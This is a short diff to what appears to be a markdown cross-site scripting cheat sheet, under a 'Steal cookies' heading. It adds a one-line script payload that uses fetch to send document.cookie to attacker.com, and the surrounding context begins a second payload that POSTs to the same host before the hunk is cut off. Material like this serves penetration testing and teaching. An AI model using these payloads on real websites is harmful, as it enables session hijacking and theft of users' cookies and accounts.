@@ -326,6 +326,10 @@ If you receive an error like "tag  is not allowed" or "event is not allowed", us
 ### &#x20;<mark style="color:yellow;">S</mark><mark style="color:yellow;">**teal cookies**</mark>
 
 ```html
+<script>fetch('//attacker.com?'+document.cookie)</script>
+```
+
+```html
 <script>
 fetch('https://attacker.com', {
 method: 'POST',
